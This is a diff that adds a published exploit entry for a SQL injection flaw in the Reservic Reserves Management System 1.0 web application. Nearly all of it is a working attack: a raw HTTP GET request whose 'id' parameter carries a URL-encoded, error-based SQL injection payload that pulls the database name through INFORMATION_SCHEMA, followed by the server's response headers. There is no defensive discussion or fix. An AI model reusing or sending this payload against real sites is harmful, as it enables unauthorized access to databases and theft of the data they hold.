@@ -1,0 +1,38 @@
+# Exploit Title: Reservic - Reserves Management System 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-20
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://ragob.com/
+# Software Link: https://codecanyon.net/item/reservic-reserves-management-system/11736786
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php/framework-crud-detailaction?crud=reserves&id=[SQL]&backTo=dashboard
+# 
+
+GET /[PATH]/index.php/framework-crud-detailaction?crud=reserves&id=4+%41%4e%44%28%53%45%4c%45%43%54%20%31+%46%52%4f%4d%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%28%53%45%4c%45%43%54%28%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%28%43%41%53%54%28%44%41%54%41%42%41%53%45%28%29+%41%53%20%43%48%41%52%29%2c%30%78%37%65%2c%30%78%34%39%36%38%37%33%36%31%36%65%35%33%36%35%36%65%36%33%36%31%36%65%29%29%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%57%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%44%41%54%41%42%41%53%45%28%29%20%4c%49%4d%49%54%20%30%2c%31%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29&backTo=dashboard HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=9832af9c6649b4b918850c9c898e05dc
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Sun, 20 Jan 2019 13:01:16 GMT
+Server: Apache/2.4.10 (Debian)
+X-Powered-By: PHP/7.0.28
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
